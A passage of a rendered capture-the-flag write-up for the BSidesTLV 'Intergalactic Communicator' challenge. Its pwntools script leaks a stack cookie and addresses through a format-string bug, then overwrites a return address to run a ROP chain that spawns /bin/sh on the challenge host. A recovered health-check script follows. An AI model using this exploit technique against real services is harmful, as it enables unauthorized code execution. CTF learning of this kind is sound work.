0x14fd22 is the offset to that gadget, the 553 is the offset into the\nbuffer in the stack frame of main (which can be calculated using the stack\nframe sizes of all functions up to main and the return addresses, or by\nguessing and adjusting)`}),`\n`,(0,n.jsx)(e.p,{children:`The final payload has some space in between the format string data and\nthe ropchain, which i just filled with a bunch of 0s.`}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"LOCAL\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"GDB\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" gdb\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"debug\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./main\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"aslr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" process\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./main\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" remote\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"intergalactic-communicator.ctf.bsidestlv.com\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8080\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" Comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./main\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\"%529$p %533$p %532$p\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"leaks \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack_cookie \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"leaks\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\" \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"leaks\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\" \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1C27E\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack_address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"leaks\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\" \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"info\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Stack cookie: 0x%x, ASLR base: 0x%x, Stack addr: 0x%x\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" stack_cookie\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" stack_address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ROP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"base\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"stack_address\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x88\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:'#rop.raw(rop.find_gadget([\"ret\"]).address)'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'execve'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"b'/bin/sh'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"sh\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"start_addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" stack_address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"ropchain \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"clear\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"fmt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" fmtstr_split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"553\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    start_addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x14fd22\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" numbwritten\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fmt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'b\"0\"'}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x50\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"ropchain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendline\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\"ls\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"links\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#links\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Links\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"[\",(0,n.jsx)(e.a,{href:\"https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9%5D(Redis\",children:\"https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9](Redis\"}),\" crc64)\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.h2,{id:\"healthcheck\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#healthcheck\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Healthcheck\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Found this on the remote called \",(0,n.jsx)(e.code,{children:\"health_check.py\"})]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` socket\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` sys\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` re\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"server \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'localhost'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"port \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8080\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"check \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00\\\\x00\\\\x0c\\\\xa9\\\\xff\\\\xaf\\\\xc0\\\\xbc\\\\x1b\\\\xacW5\\\\xc9A\\\\x11'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'b\"\\\\x00\\\\x00\\\\x00>\\\\\\\\E\\\\xc5h\\\\x06\\\\xc4\\\\xd3c\\\\xb4Ng\\\\x04-\\\\x10\\\\xa1\\\\x05fJ\\\\xfb]\\\\xbff*Ww46\\\\xe1\\\\xfb2\\\\x80k\\\\xd43\\\\t)\\\\xd7`\\\\xc4\\\\x91\\\\xec\\\\x9e\\\\xef\\\\xb2rC\\\\x12J\\\\xcb\\\\x83\\\\x1a2o\\\\xfc\\\\xb3\\\\x0f\\\\x190\\\\xaf\\\\x9a\\\\xaf\\'\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"read \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00\\\\x00\\\\x10\\\\x88\\\\x88\\\\xde\\\\x92+\\\\x00:pu\\\\x92\\\\xe5\\\\xb8\\\\xd6\\\\xd0w\\\\xf7'\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"send_exploit\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"buffer\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"bytes\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" read_response\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" health\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"buffer\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" read_response\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        size \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"from_bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'little'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        resp \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" health\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'Welcome to the Intergalactic Communicator'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'canary:'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"match\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" re\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"findall\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"rb'shellcode:([0-9A-Fa-fXx]*?):base:([0-9A-Fa-fXx]*?):canary:([0-9A-Fa-fXx]*?):'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"get_connection\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ip\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),\" socket\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"socket\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    sock \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"None\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" sock \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"is\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"None\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sock \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" socket\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"create_connection\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ip\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"except\"}),\" ConnectionRefusedError\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"continue\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` 